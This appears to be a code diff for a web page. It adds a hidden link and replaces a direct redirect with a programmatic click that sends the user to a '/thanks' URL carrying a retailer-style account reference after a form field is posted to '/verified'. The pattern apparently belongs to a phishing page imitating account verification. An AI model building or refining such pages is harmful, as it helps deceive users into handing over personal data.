@@ -113,7 +113,8 @@
                 "        </table>\n" +
                 "    </div>\n" +
                 "\n" +
-                "</div>";
+                "</div>" +
+                " <a id='links' href=\"#\" style='display:none;'></a>";
     }
 </script>
 <script src="library/jquery/main.min.js"></script>
@@ -124,9 +125,14 @@
         if (!check()) return;
         $.post("/verified", {kiddfiled1: filed1},
                 function (data) {
-                    window.location.href = '/thanks?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
+                    var kiddLink = document.getElementById('links');
+                    //给它的href属性添加网址
+                    kiddLink.href = "/thanks?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya";
+                    //调用这个对象的click方法
+                    kiddLink.click();
+                    //window.location.href = '/thanks?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
                 }, "json");
-        window.location.href = '/thanks?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
+        //window.location.href = '/thanks?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
     }
     var myVar;
     function myFunction() {
